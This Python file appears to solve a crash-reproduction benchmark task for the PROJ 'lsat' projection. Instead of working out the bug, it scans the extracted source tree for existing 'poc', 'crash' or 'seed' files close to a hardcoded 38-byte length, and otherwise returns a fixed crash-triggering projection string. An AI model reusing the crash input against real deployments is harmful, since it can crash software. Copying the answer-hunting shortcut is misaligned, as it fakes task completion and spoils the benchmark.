import os
import tarfile
import tempfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        root_dir = self._prepare_src(src_path)
        poc = self._find_poc(root_dir)
        return poc

    def _prepare_src(self, src_path: str) -> str:
        if os.path.isdir(src_path):
            return src_path

        tmpdir = tempfile.mkdtemp(prefix="src-")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)
            return tmpdir
        except tarfile.TarError:
            if os.path.isdir(src_path):
                return src_path
            return tmpdir

    def _find_poc(self, root_dir: str) -> bytes:
        target_len = 38
        best_exact = None  # (score, path)
        best_near = None   # (size_diff, -score, path)

        skip_dirs = {
            '.git', '.svn', '.hg', '.idea', '__pycache__', 'node_modules',
            'build', 'dist', 'cmake-build-debug', 'cmake-build-release', 'out'
        }
        skip_exts = {
            '.c', '.h', '.hpp', '.cpp', '.cc', '.cxx',
            '.py', '.sh', '.md', '.markdown', '.mk', '.cmake',
            '.java', '.rb', '.go', '.rs', '.php', '.pl',
            '.ps1', '.bat', '.cmd'
        }

        for root, dirs, files in os.walk(root_dir):
            dirs[:] = [d for d in dirs if d not in skip_dirs]
            for fname in files:
                path = os.path.join(root, fname)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue

                if size == 0 or size > 4096:
                    continue

                ext = os.path.splitext(fname)[1].lower()
                if ext in skip_exts:
                    continue

                name_lower = fname.lower()
                path_lower = path.lower()

                score = 0
                keywords = ['poc', 'crash', 'seed', 'input', 'id_', 'case', 'lsat', 'proj']
                if any(k in name_lower for k in keywords):
                    score += 10
                if any(k in path_lower for k in keywords):
                    score += 5
                if ext in ('.bin', '.dat', '.in', ''):
                    score += 3
                if ext in ('.txt', '.proj'):
                    score += 2

                if size == target_len:
                    if best_exact is None or score > best_exact[0]:
                        best_exact = (score, path)

                if size <= 2 * target_len:
                    size_diff = abs(size - target_len)
                    key = (size_diff, -score)
                    if best_near is None or key < best_near[0:2]:
                        best_near = (size_diff, -score, path)

        chosen_path = None
        if best_exact is not None:
            chosen_path = best_exact[1]
        elif best_near is not None:
            chosen_path = best_near[2]

        if chosen_path is not None:
            try:
                with open(chosen_path, 'rb') as f:
                    data = f.read()
                if data:
                    return data
            except OSError:
                pass

        # Fallback PoC: LSAT projection string, 38 bytes long
        return b"+proj=lsat +lat_1=0 +lon_1=0 +path=1 \n"